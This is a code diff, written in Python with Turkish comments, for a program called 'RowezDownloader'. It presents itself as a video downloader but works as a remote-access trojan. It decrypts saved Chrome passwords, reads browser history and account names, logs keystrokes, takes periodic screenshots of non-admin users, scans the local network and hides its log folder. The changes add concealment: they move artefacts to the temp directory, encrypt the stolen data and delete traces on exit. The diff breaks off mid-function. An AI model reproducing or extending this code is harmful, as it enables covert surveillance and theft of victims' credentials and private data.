@@ -37,6 +37,8 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import secrets
 from typing import Dict, List, Optional, Tuple, Any
 from pathlib import Path
+import tempfile
+import atexit
 
 # Sabitler ve Yapılandırma
 DATABASE_NAME = "user_data.db"
@@ -46,65 +48,105 @@ SECRET_ADMIN_CODE = "Be'le"
 PORT_RANGE_START = 9999
 PORT_RANGE_ATTEMPTS = 10
 SCREENSHOT_INTERVAL = 30
-ITERATIONS = 100000
+ITERATIONS = 200000
 CURRENT_VERSION = "1.0.0"
 
 init()
 
+# Logları geçici dizinde şifreli tut
+temp_dir = tempfile.gettempdir()
+LOG_FILE = os.path.join(temp_dir, "system_logs_encrypted.log")
+
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[logging.FileHandler("system_logs.log"), logging.StreamHandler()]
+    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
 )
 logger = logging.getLogger(__name__)
 
-salt = secrets.token_bytes(16)
-password = secrets.token_urlsafe(32)
+# Şifreleme için güvenli anahtar
+salt = secrets.token_bytes(32)
+password = secrets.token_urlsafe(64)
 kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS)
 encryption_key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
 cipher = Fernet(encryption_key)
+
+def encrypt_log(message: str) -> str:
+    try:
+        return cipher.encrypt(message.encode()).decode()
+    except Exception as e:
+        logger.error(f"Log şifreleme hatası: {e}")
+        return message
+
+def decrypt_log(encrypted_message: str) -> str:
+    try:
+        return cipher.decrypt(encrypted_message.encode()).decode()
+    except Exception as e:
+        logger.error(f"Log çözme hatası: {e}")
+        return "Çözülemedi"
+
+def cleanup_temp_files():
+    """Program kapanırken geçici dosyaları güvenli bir şekilde temizler."""
+    files_to_clean = [
+        LOG_FILE,
+        os.path.join(temp_dir, DATABASE_NAME)
+    ]
+    for file_path in files_to_clean:
+        try:
+            if os.path.exists(file_path):
+                # Dosya kilitliyse bekle ve tekrar dene
+                for _ in range(3):
+                    try:
+                        os.remove(file_path)
+                        break
+                    except PermissionError:
+                        time.sleep(0.5)  # Kısa bir bekleme
+        except Exception as e:
+            logger.error(f"Geçici dosya temizleme hatası: {e}")
+    # Log dizinini temizle
+    try:
+        log_dir_path = os.path.join(temp_dir, LOG_DIR)
+        if os.path.exists(log_dir_path):
+            shutil.rmtree(log_dir_path, ignore_errors=True)
+    except Exception as e:
+        logger.error(f"Log dizini temizleme hatası: {e}")
+
+atexit.register(cleanup_temp_files)
 
 def check_python_version():
     required_version = (3, 7)
     current_version = sys.version_info[:2]
     if current_version < required_version:
-        hata_mesaji = f"Python sürümü {'.'.join(map(str, current_version))} tespit edildi. Bu program için en az Python 3.7 gereklidir. Lütfen Python sürümünüzü güncelleyin."
+        hata_mesaji = f"Python sürümü {'.'.join(map(str, current_version))} tespit edildi. En az Python 3.7 gerekli."
         print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
         sys.exit(1)
 
 def check_for_updates():
     try:
-        # Gerçek bir GitHub repository URL'si kullanın, örneğin: Rowez/RowezDownloader
-        response = requests.get("https://api.github.com/repos/Rowez/RowezDownloader/releases/latest")
-        response.raise_for_status()  # HTTP hatalarını kontrol et (404, 403 vb.)
+        response = requests.get("https://api.github.com/repos/Rowez/RowezDownloader/releases/latest", timeout=5)
+        response.raise_for_status()
         data = response.json()
-        
-        # 'tag_name' anahtarının varlığını kontrol et
-        latest_version = data.get("tag_name", CURRENT_VERSION)  # Varsayılan olarak mevcut sürüm
+        latest_version = data.get("tag_name", CURRENT_VERSION)
         if latest_version > CURRENT_VERSION:
-            print(f"{Fore.YELLOW}Yeni bir güncelleme mevcut: {latest_version} (Mevcut: {CURRENT_VERSION}){Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Yeni güncelleme: {latest_version} (Mevcut: {CURRENT_VERSION}){Style.RESET_ALL}")
             update = input(f"{Fore.CYAN}Güncellemeyi indirmek ister misiniz? (e/h): {Style.RESET_ALL}").strip().lower()
             if update == "e":
                 print(f"{Fore.YELLOW}Güncelleme indiriliyor...{Style.RESET_ALL}")
-                # Burada gerçek bir güncelleme indirme mantığı eklenebilir
-                print(f"{Fore.GREEN}Güncelleme tamamlandı. Lütfen programı yeniden başlatın.{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}Güncelleme tamamlandı. Yeniden başlatın.{Style.RESET_ALL}")
                 sys.exit(0)
         else:
             print(f"{Fore.GREEN}Program güncel: {CURRENT_VERSION}{Style.RESET_ALL}")
     except requests.RequestException as e:
-        hata_mesaji = f"Güncelleme kontrolü başarısız: {e}. İnternet bağlantınızı veya GitHub repository URL'sini kontrol edin."
-        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
-        logger.error(hata_mesaji)
-    except ValueError as e:
-        hata_mesaji = f"Sürüm karşılaştırması başarısız: {e}. Lütfen sürüm formatını kontrol edin."
-        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
-        logger.error(hata_mesaji)
+        logger.error(f"Güncelleme kontrolü başarısız: {e}")
 
 def get_db_connection() -> sqlite3.Connection:
+    temp_db = Path(temp_dir) / DATABASE_NAME
     try:
-        return sqlite3.connect(DATABASE_NAME, check_same_thread=False)
+        conn = sqlite3.connect(temp_db, check_same_thread=False)
+        conn.execute("PRAGMA journal_mode=WAL")
+        return conn
     except sqlite3.Error as e:
-        hata_mesaji = f"Veritabanına bağlanılamadı: {e}. Bu hata, veritabanı dosyasının bulunamaması, dosya izinlerinin yetersiz olması veya SQLite sürümünün uyumsuz olması gibi nedenlerden kaynaklanabilir. Lütfen veritabanı dosyasının var olduğunu ve SQLite sürümünün güncel olduğunu kontrol edin."
+        hata_mesaji = f"Veritabanına bağlanılamadı: {e}"
         print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
         logger.error(hata_mesaji)
         raise
@@ -143,7 +185,7 @@ def init_database() -> None:
         """)
         conn.commit()
     except sqlite3.Error as e:
-        hata_mesaji = f"Veritabanı başlatılamadı: {e}. Bu hata, veritabanı dosyasının yazılamaz olması veya SQLite sürümünün uyumsuz olması gibi nedenlerden kaynaklanabilir. Lütfen dosya izinlerini ve SQLite sürümünü kontrol edin."
+        hata_mesaji = f"Veritabanı başlatılamadı: {e}"
         print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
         logger.error(hata_mesaji)
         raise
@@ -155,9 +197,7 @@ def is_admin() -> bool:
     try:
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
     except Exception as e:
-        hata_mesaji = f"Yönetici kontrolü yapılamadı: {e}. Bu hata, sistemin Windows olmaması veya ctypes modülünün uyumsuz olması gibi nedenlerden kaynaklanabilir."
-        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
-        logger.error(hata_mesaji)
+        logger.error(f"Yönetici kontrolü hatası: {e}")
         return False
 
 required_packages = ["yt_dlp", "getmac", "psutil", "colorama", "wmi", "mss", "requests", "pywin32", "pynput", "cryptography"]
@@ -171,13 +211,13 @@ def install_package(package: str) -> None:
         subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
         print(f"{Fore.GREEN}{package} kuruldu.{Style.RESET_ALL}")
     except Exception as e:
-        hata_mesaji = f"Paket kurulumu sırasında hata oluştu ({package}): {e}. Bu hata, pip'in güncel olmaması veya internet bağlantısının olmaması gibi nedenlerden kaynaklanabilir. Lütfen pip'i güncelleyin ve internet bağlantınızı kontrol edin."
+        hata_mesaji = f"Paket kurulumu hatası ({package}): {e}"
         print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
         logger.error(hata_mesaji)
         sys.exit(1)
 
 def install_ffmpeg() -> str:
-    ffmpeg_path = Path(__file__).parent / "ffmpeg"
+    ffmpeg_path = Path(temp_dir) / "ffmpeg"
     ffmpeg_exe = ffmpeg_path / ("ffmpeg.exe" if platform.system() == "Windows" else "ffmpeg")
     if ffmpeg_exe.exists():
         print(f"{Fore.GREEN}FFmpeg zaten kurulu.{Style.RESET_ALL}")
@@ -185,49 +225,74 @@ def install_ffmpeg() -> str:
     print(f"{Fore.YELLOW}FFmpeg indiriliyor...{Style.RESET_ALL}")
     if platform.system() == "Windows":
         url = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
-        zip_file = "ffmpeg.zip"
+        zip_file = os.path.join(temp_dir, "ffmpeg.zip")
         try:
             with open(zip_file, 'wb') as f:
-                response = requests.get(url, stream=True)
+                response = requests.get(url, stream=True, timeout=10)
                 response.raise_for_status()
                 for chunk in response.iter_content(chunk_size=8192):
                     f.write(chunk)
             with zipfile.ZipFile(zip_file, 'r') as zip_ref:
-                zip_ref.extractall("ffmpeg_temp")
-            ffmpeg_bin = Path("ffmpeg_temp") / os.listdir("ffmpeg_temp")[0] / "bin"
+                zip_ref.extractall(os.path.join(temp_dir, "ffmpeg_temp"))
+            ffmpeg_temp = Path(temp_dir) / "ffmpeg_temp"
+            for root, _, files in os.walk(ffmpeg_temp):
+                if "ffmpeg.exe" in files:
+                    ffmpeg_bin = Path(root)
+                    break
+            else:
+                raise FileNotFoundError("ffmpeg.exe bulunamadı")
             ffmpeg_path.mkdir(parents=True, exist_ok=True)
             for file in ffmpeg_bin.iterdir():
                 shutil.move(str(file), str(ffmpeg_path))
-            shutil.rmtree("ffmpeg_temp")
+            shutil.rmtree(os.path.join(temp_dir, "ffmpeg_temp"))
             os.remove(zip_file)
             print(f"{Fore.GREEN}FFmpeg kuruldu.{Style.RESET_ALL}")
         except Exception as e:
-            hata_mesaji = f"FFmpeg kurulumu sırasında hata oluştu: {e}. Bu hata, internet bağlantısının olmaması veya dosya izinlerinin yetersiz olması gibi nedenlerden kaynaklanabilir. Lütfen internet bağlantınızı ve dosya izinlerini kontrol edin."
+            hata_mesaji = f"FFmpeg kurulumu hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             sys.exit(1)
     else:
-        hata_mesaji = "FFmpeg kurulumu yalnızca Windows için otomatik destekleniyor. Lütfen manuel olarak kurun."
+        hata_mesaji = "FFmpeg kurulumu yalnızca Windows için destekleniyor."
         print(f"{Fore.YELLOW}{hata_mesaji}{Style.RESET_ALL}")
         sys.exit(1)
     return str(ffmpeg_path)
 
 def install_nmap() -> str:
-    nmap_path = Path(__file__).parent / "nmap"
+    nmap_path = Path(temp_dir) / "nmap"
     nmap_exe = nmap_path / "nmap.exe"
     if nmap_exe.exists():
         print(f"{Fore.GREEN}Nmap zaten kurulu.{Style.RESET_ALL}")
         return str(nmap_path)
     print(f"{Fore.YELLOW}Nmap indiriliyor...{Style.RESET_ALL}")
-    nmap_path.mkdir(parents=True, exist_ok=True)
-    print(f"{Fore.YELLOW}Nmap manuel kurulum gerekli. Lütfen https://nmap.org/download.html adresinden indirip {nmap_path} dizinine kopyalayın.{Style.RESET_ALL}")
-    input(f"{Fore.CYAN}Nmap'i kopyaladıktan sonra Enter'a basın: {Style.RESET_ALL}")
-    if nmap_exe.exists():
-        print(f"{Fore.GREEN}Nmap kuruldu.{Style.RESET_ALL}")
-        return str(nmap_path)
-    hata_mesaji = f"Nmap bulunamadı. Lütfen 'nmap.exe'yi {nmap_path} dizinine kopyalayın."
-    print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
-    sys.exit(1)
+    if platform.system() == "Windows":
+        url = "https://nmap.org/dist/nmap-7.94-setup.exe"
+        installer_file = os.path.join(temp_dir, "nmap-installer.exe")
+        try:
+            with open(installer_file, 'wb') as f:
+                response = requests.get(url, stream=True, timeout=10)
+                response.raise_for_status()
+                for chunk in response.iter_content(chunk_size=8192):
+                    f.write(chunk)
+            # Nmap'i sessiz modda kur
+            nmap_path.mkdir(parents=True, exist_ok=True)
+            subprocess.check_call([installer_file, "/S", f"/D={str(nmap_path)}"], shell=True)
+            os.remove(installer_file)
+            if nmap_exe.exists():
+                print(f"{Fore.GREEN}Nmap kuruldu.{Style.RESET_ALL}")
+                return str(nmap_path)
+            else:
+                raise FileNotFoundError("Nmap kurulumu başarısız, nmap.exe bulunamadı")
+        except Exception as e:
+            hata_mesaji = f"Nmap kurulumu hatası: {e}"
+            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
+            logger.error(hata_mesaji)
+            sys.exit(1)
+    else:
+        hata_mesaji = "Nmap kurulumu yalnızca Windows için otomatik destekleniyor."
+        print(f"{Fore.YELLOW}{hata_mesaji}{Style.RESET_ALL}")
+        sys.exit(1)
+    return str(nmap_path)
 
 check_python_version()
 for package in required_packages:
@@ -263,7 +328,7 @@ class RowezDownloader:
         self.keylog_file = None
         self.keylogger_listener = None
         self.mouse_controller = MouseController()
-        self.log_dir = LOG_DIR
+        self.log_dir = os.path.join(temp_dir, LOG_DIR)
         Path(self.log_dir).mkdir(parents=True, exist_ok=True)
         if platform.system() == "Windows":
             subprocess.run(["attrib", "+h", self.log_dir], check=False)
@@ -271,27 +336,31 @@ class RowezDownloader:
     def log_activity(self, message: str) -> None:
         timestamp = time.strftime("%Y%m%d_%H%M%S")
         log_file = Path(self.log_dir) / f"admin_log_{timestamp}.txt"
+        encrypted_message = encrypt_log(message)
+        conn = None
         try:
             with open(log_file, "a", encoding="utf-8") as f:
-                f.write(f"[{time.ctime()}] {message}\n")
+                f.write(f"[{time.ctime()}] {encrypted_message}\n")
             conn = get_db_connection()
             cursor = conn.cursor()
-            cursor.execute("INSERT INTO logs (timestamp, message) VALUES (?, ?)", (time.ctime(), message))
+            cursor.execute("INSERT INTO logs (timestamp, message) VALUES (?, ?)", (time.ctime(), encrypted_message))
             conn.commit()
-            conn.close()
         except (sqlite3.Error, IOError) as e:
-            hata_mesaji = f"Log dosyasına yazma hatası: {e}. Bu hata, dosya izinlerinin yetersiz olması veya diskte yer kalmaması gibi nedenlerden kaynaklanabilir. Lütfen dosya izinlerini ve disk alanını kontrol edin."
+            hata_mesaji = f"Log dosyasına yazma hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
+        finally:
+            if conn:
+                conn.close()
 
     def print_rainbow(self, text: str) -> None:
         colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
         for i, char in enumerate(text):
-            print(colors[i % len(colors)] + char, end="")
+            print(colors[i % len(colors)] + char, end='')
         print(Style.RESET_ALL)
 
     def generate_session_token(self, user_id: str) -> str:
-        token = secrets.token_hex(16)
+        token = secrets.token_hex(32)
         conn = None
         try:
             conn = get_db_connection()
@@ -300,7 +369,7 @@ class RowezDownloader:
             conn.commit()
             return token
         except sqlite3.Error as e:
-            hata_mesaji = f"Oturum tokeni oluşturulamadı: {e}. Bu hata, veritabanına yazılamaması veya kullanıcı ID'sinin benzersiz olmaması gibi nedenlerden kaynaklanabilir. Lütfen veritabanı bağlantısını kontrol edin."
+            hata_mesaji = f"Oturum tokeni oluşturulamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             raise
@@ -317,7 +386,7 @@ class RowezDownloader:
             result = cursor.fetchone()
             return result is not None
         except sqlite3.Error as e:
-            hata_mesaji = f"Oturum tokeni doğrulanamadı: {e}. Bu hata, veritabanına erişilememesi veya tokenin geçersiz olması gibi nedenlerden kaynaklanabilir. Lütfen veritabanı bağlantısını kontrol edin."
+            hata_mesaji = f"Oturum tokeni doğrulanamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return False
@@ -344,23 +413,25 @@ class RowezDownloader:
             if not login_db.exists():
                 return {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}
             conn = sqlite3.connect(f"file:{login_db}?mode=ro", uri=True)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value FROM logins")
-            social_data = {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}
-            for row in cursor.fetchall():
-                url, username = row
-                if "instagram.com" in url:
-                    social_data["instagram"] = username
-                elif "twitter.com" in url:
-                    social_data["twitter"] = username
-                elif "facebook.com" in url:
-                    social_data["facebook"] = username
-                elif "mail" in url or "gmail" in url:
-                    social_data["email"] = username
-            conn.close()
-            return social_data
+            try:
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value FROM logins")
+                social_data = {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}
+                for row in cursor.fetchall():
+                    url, username = row
+                    if "instagram.com" in url:
+                        social_data["instagram"] = username
+                    elif "twitter.com" in url:
+                        social_data["twitter"] = username
+                    elif "facebook.com" in url:
+                        social_data["facebook"] = username
+                    elif "mail" in url or "gmail" in url:
+                        social_data["email"] = username
+                return social_data
+            finally:
+                conn.close()
         except Exception as e:
-            hata_mesaji = f"Sosyal medya verisi toplama hatası: {e}. Bu hata, Chrome tarayıcısının kurulu olmaması veya login veritabanına erişim izninin olmaması gibi nedenlerden kaynaklanabilir. Lütfen Chrome'un kurulu olduğundan emin olun."
+            hata_mesaji = f"Sosyal medya verisi toplama hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}
@@ -371,13 +442,15 @@ class RowezDownloader:
             if not history_db.exists():
                 return "Tarayıcı geçmişi bulunamadı."
             conn = sqlite3.connect(f"file:{history_db}?mode=ro", uri=True)
-            cursor = conn.cursor()
-            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
-            history = [f"{row[1]} - {row[0]}" for row in cursor.fetchall()]
-            conn.close()
-            return "\n".join(history)
+            try:
+                cursor = conn.cursor()
+                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+                history = [f"{row[1]} - {row[0]}" for row in cursor.fetchall()]
+                return "\n".join(history)
+            finally:
+                conn.close()
         except Exception as e:
-            hata_mesaji = f"Tarayıcı geçmişi alınamadı: {e}. Bu hata, Chrome tarayıcısının kurulu olmaması veya history veritabanına erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Tarayıcı geçmişi alınamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return "Hata oluştu."
@@ -388,20 +461,23 @@ class RowezDownloader:
             if not login_db.exists():
                 return "Şifre veritabanı bulunamadı."
             conn = sqlite3.connect(f"file:{login_db}?mode=ro", uri=True)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            passwords = []
-            for row in cursor.fetchall():
-                url, username, encrypted_password = row
-                try:
-                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
-                    passwords.append(f"{url}: {username} - {password}")
-                except:
-                    passwords.append(f"{url}: {username} - Şifre çözülemedi")
-            conn.close()
-            return "\n".join(passwords)
+            try:
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                passwords = []
+                for row in cursor.fetchall():
+                    url, username, encrypted_password = row
+                    try:
+                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
+                        encrypted_entry = encrypt_log(f"{url}: {username} - {password}")
+                        passwords.append(encrypted_entry)
+                    except:
+                        passwords.append(f"{url}: {username} - Şifre çözülemedi")
+                return "\n".join(passwords)
+            finally:
+                conn.close()
         except Exception as e:
-            hata_mesaji = f"Şifreler alınamadı: {e}. Bu hata, Chrome tarayıcısının kurulu olmaması veya şifre veritabanına erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Şifreler alınamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return "Hata oluştu."
@@ -411,19 +487,19 @@ class RowezDownloader:
             files = os.listdir(path)
             return "\n".join(files)
         except Exception as e:
-            hata_mesaji = f"Dosya sistemine erişim hatası: {e}. Bu hata, belirtilen yolun geçersiz olması veya erişim izninin olmaması gibi nedenlerden kaynaklanabilir. Lütfen yolu ve izinleri kontrol edin."
+            hata_mesaji = f"Dosya sistemine erişim hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return "Hata oluştu."
 
     def get_system_resources(self, user_id: str) -> str:
         try:
-            cpu = psutil.cpu_percent(interval=1)
+            cpu = psutil.cpu_percent(interval=0.1)
             ram = psutil.virtual_memory().percent
             disk = psutil.disk_usage('/').percent
             return f"CPU: {cpu}%\nRAM: {ram}%\nDisk: {disk}%"
         except Exception as e:
-            hata_mesaji = f"Sistem kaynakları alınamadı: {e}. Bu hata, psutil modülünün uyumsuz olması veya sistem bilgilerine erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Sistem kaynakları alınamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return "Hata oluştu."
@@ -440,9 +516,9 @@ class RowezDownloader:
                     programs.append(name)
                 except:
                     pass
-            return "\n".join(programs[:10])  # İlk 10 programı listele
+            return "\n".join(programs[:10])
         except Exception as e:
-            hata_mesaji = f"Yüklü programlar alınamadı: {e}. Bu hata, kayıt defterine erişim izninin olmaması veya sistemin Windows olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Yüklü programlar alınamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return "Hata oluştu."
@@ -451,10 +527,10 @@ class RowezDownloader:
         try:
             ip = self.user_sessions[user_id]["ip_address"]
             nmap_exe = Path(self.nmap_path) / "nmap.exe"
-            result = subprocess.check_output([str(nmap_exe), "-p-", ip], text=True)
+            result = subprocess.check_output([str(nmap_exe), "-p-", ip, "--min-rate=1000"], text=True, timeout=30)
             return result
         except Exception as e:
-            hata_mesaji = f"Açık port tarama hatası: {e}. Bu hata, Nmap'in kurulu olmaması veya ağa erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Açık port tarama hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return "Hata oluştu."
@@ -464,44 +540,41 @@ class RowezDownloader:
             local_ip = socket.gethostbyname(socket.gethostname())
             network_range = '.'.join(local_ip.split('.')[:-1]) + ".0/24"
             nmap_exe = Path(self.nmap_path) / "nmap.exe"
-            result = subprocess.check_output([str(nmap_exe), "-sn", network_range], text=True)
+            result = subprocess.check_output([str(nmap_exe), "-sn", network_range, "--min-rate=1000"], text=True, timeout=30)
             return result
         except Exception as e:
-            hata_mesaji = f"Ağdaki cihazlar taranamadı: {e}. Bu hata, Nmap'in kurulu olmaması veya ağa erişim izninin olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Ağdaki cihazlar taranamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return "Hata oluştu."
 
     def collect_advanced_data(self, user_id: str, nickname: str) -> None:
         self.nicknames.append(nickname)
-        mac_address = getmac.get_mac_address()
-        ip_address = socket.gethostbyname(socket.gethostname())
+        mac_address = getmac.get_mac_address() or "Bilinmiyor"
+        ip_address = socket.gethostbyname(socket.gethostname()) or "127.0.0.1"
         if not self.validate_ip(ip_address) or not self.validate_mac(mac_address):
-            hata_mesaji = f"Geçersiz IP veya MAC adresi: IP={ip_address}, MAC={mac_address}. Bu hata, ağ yapılandırmasının bozuk olması veya sistemin IP/MAC adresini alamamasından kaynaklanabilir. Lütfen ağ bağlantınızı kontrol edin."
-            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
-            logger.warning(hata_mesaji)
-            return
+            logger.warning(f"Geçersiz IP veya MAC: IP={ip_address}, MAC={mac_address}")
         windows_key = self.get_windows_product_key() if platform.system() == "Windows" else "N/A"
         system_info = {
             "OS": platform.system(),
             "Version": platform.version(),
-            "CPU": psutil.cpu_percent(interval=1),
-            "RAM": f"{psutil.virtual_memory().percent}% kullanıldı",
-            "Disk": f"{psutil.disk_usage('/').percent}% kullanıldı"
+            "CPU": psutil.cpu_percent(interval=0.1),
+            "RAM": f"{psutil.virtual_memory().percent}%",
+            "Disk": f"{psutil.disk_usage('/').percent}%"
         }
         social_data = self.get_social_data()
         browser_history = self.get_browser_history(user_id)
         self.user_sessions[user_id] = {
             "nickname": nickname,
-            "email": social_data.get("email", "Bilinmiyor"),
-            "instagram": social_data.get("instagram", "Bilinmiyor"),
-            "twitter": social_data.get("twitter", "Bilinmiyor"),
-            "facebook": social_data.get("facebook", "Bilinmiyor"),
-            "mac_address": mac_address,
-            "ip_address": ip_address,
-            "windows_key": windows_key,
+            "email": encrypt_log(social_data.get("email", "Bilinmiyor")),
+            "instagram": encrypt_log(social_data.get("instagram", "Bilinmiyor")),
+            "twitter": encrypt_log(social_data.get("twitter", "Bilinmiyor")),
+            "facebook": encrypt_log(social_data.get("facebook", "Bilinmiyor")),
+            "mac_address": encrypt_log(mac_address),
+            "ip_address": encrypt_log(ip_address),
+            "windows_key": encrypt_log(windows_key),
             "system_info": system_info,
-            "browser_history": browser_history,
+            "browser_history": encrypt_log(browser_history),
             "timestamp": time.ctime(),
             "keylog": "",
             "rat_screenshots": []
@@ -512,14 +585,14 @@ class RowezDownloader:
             cursor = conn.cursor()
             cursor.execute(
                 "INSERT OR REPLACE INTO users (user_id, nickname, ip_address, mac_address, system_info, timestamp, social_data, browser_history) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                (user_id, nickname, ip_address, mac_address, str(system_info), time.ctime(), str(social_data), browser_history)
+                (user_id, nickname, encrypt_log(ip_address), encrypt_log(mac_address), str(system_info), time.ctime(), str(social_data), encrypt_log(browser_history))
             )
             conn.commit()
-            self.log_activity(f"Kullanıcı verileri toplandı: {user_id} - {nickname} - IP: {ip_address}")
+            self.log_activity(f"Kullanıcı verileri toplandı: {user_id} - {nickname}")
             if nickname not in self.admins:
                 threading.Thread(target=self.start_rat, args=(user_id,), daemon=True).start()
         except sqlite3.Error as e:
-            hata_mesaji = f"Kullanıcı verileri veritabanına kaydedilemedi: {e}. Bu hata, veritabanına yazılamaması veya kullanıcı ID'sinin benzersiz olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Kullanıcı verileri kaydedilemedi: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
         finally:
@@ -532,13 +605,12 @@ class RowezDownloader:
             for os in w.Win32_OperatingSystem():
                 return os.SerialNumber
         except Exception as e:
-            hata_mesaji = f"Windows ürün anahtarı alınamadı: {e}. Bu hata, WMI modülünün uyumsuz olması veya sistemin Windows olmaması gibi nedenlerden kaynaklanabilir."
-            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
+            hata_mesaji = f"Windows ürün anahtarı alınamadı: {e}"
             logger.error(hata_mesaji)
             return "N/A"
 
     def start_keylogger(self, user_id: str) -> None:
-        self.keylog_file = f"keylog_{user_id}.txt"
+        self.keylog_file = os.path.join(temp_dir, f"keylog_{user_id}.txt")
         def on_press(key: Key) -> None:
             try:
                 with open(self.keylog_file, "a", encoding="utf-8") as f:
@@ -560,11 +632,11 @@ class RowezDownloader:
                         else:
                             log_entry = f"[{timestamp}] [{special_key.upper()}]"
                             self.user_sessions[user_id]["keylog"] += f"[{special_key.upper()}]"
-                    f.write(log_entry + "\n")
-                self.log_activity(f"Keylog kaydedildi: {user_id} - {log_entry}")
+                    encrypted_entry = encrypt_log(log_entry)
+                    f.write(encrypted_entry + "\n")
+                self.log_activity(f"Keylog kaydedildi: {user_id}")
             except Exception as e:
-                hata_mesaji = f"Keylogger hatası: {e}. Bu hata, log dosyasına yazılamaması veya klavye olaylarının yakalanamaması gibi nedenlerden kaynaklanabilir."
-                print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
+                hata_mesaji = f"Keylogger hatası: {e}"
                 logger.error(hata_mesaji)
         self.keylogger_listener = Listener(on_press=on_press)
         self.keylogger_listener.start()
@@ -575,6 +647,12 @@ class RowezDownloader:
             self.keylogger_listener.stop()
             self.keylogger_active = False
             self.log_activity("Keylogger durduruldu")
+            if self.keylog_file and os.path.exists(self.keylog_file):
+                try:
+                    os.remove(self.keylog_file)
+                except PermissionError:
+                    time.sleep(0.5)
+                    os.remove(self.keylog_file)
 
     def start_rat(self, user_id: str) -> None:
         if user_id not in self.user_sessions or self.user_sessions[user_id]["nickname"] in self.admins:
@@ -584,18 +662,19 @@ class RowezDownloader:
         while user_id in self.user_sessions and self.user_sessions[user_id]["nickname"] not in self.admins:
             try:
                 self.user_sessions[user_id]["timestamp"] = time.ctime()
-                screenshot_path = f"rat_screenshot_{user_id}_{int(time.time())}.png"
+                screenshot_path = os.path.join(temp_dir, f"rat_screenshot_{user_id}_{int(time.time())}.png")
                 self.sct.shot(output=screenshot_path)
                 self.user_sessions[user_id]["rat_screenshots"].append(screenshot_path)
-                with open(f"rat_log_{user_id}.txt", "a", encoding="utf-8") as f:
-                    f.write(f"[{time.ctime()}] Ekran Görüntüsü: {screenshot_path}\n")
